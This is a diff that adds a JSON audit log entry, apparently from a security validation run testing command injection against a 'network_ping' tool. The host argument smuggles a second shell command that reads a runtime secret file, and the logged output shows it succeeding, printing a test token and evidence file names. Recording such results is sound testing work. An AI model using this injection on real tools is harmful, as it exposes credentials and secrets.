@@ -1,0 +1,13 @@
+{
+  "audit_id": "e2fb78412a4f0d4d",
+  "run_id": "validation-full-8a62f4d1",
+  "timestamp": "2026-10-08T12:47:46.168024Z",
+  "tool": "network_ping",
+  "arguments": {
+    "host": "127.0.0.1; cat /app/logs/runtime_secret.txt"
+  },
+  "decision": "allow (permissive)",
+  "latency_ms": 18.6,
+  "result_truncated": "{'content': [{'type': 'text', 'text': 'mcpuser\\nTEST_TOKEN_e85d4ab78f9ecd4745c775c57b0186453bef563b_quarantine_20260911\\naudit\\nruns\\nruntime_secret.txt\\nvuln_evidence_NEW-TCMCP-001-elicitation-credential-phishing.json\\nvuln_evidence_NEW-TCMCP-002-elicitation-url-mode-token-exfil.json\\nvuln_evidence_NEW-TCMCP-003-cache-poisoning-cross-user.json\\nvuln_evidence_NEW-TCMCP-004-mrtr-requeststate-tampering.json\\nvuln_evidence_NEW-TCMCP-005-subscriptions-unauthorized-listen.json\\nvuln_evidence_NEW-TCMC",
+  "scenario_name": "TCMCP-204-command-injection"
+}
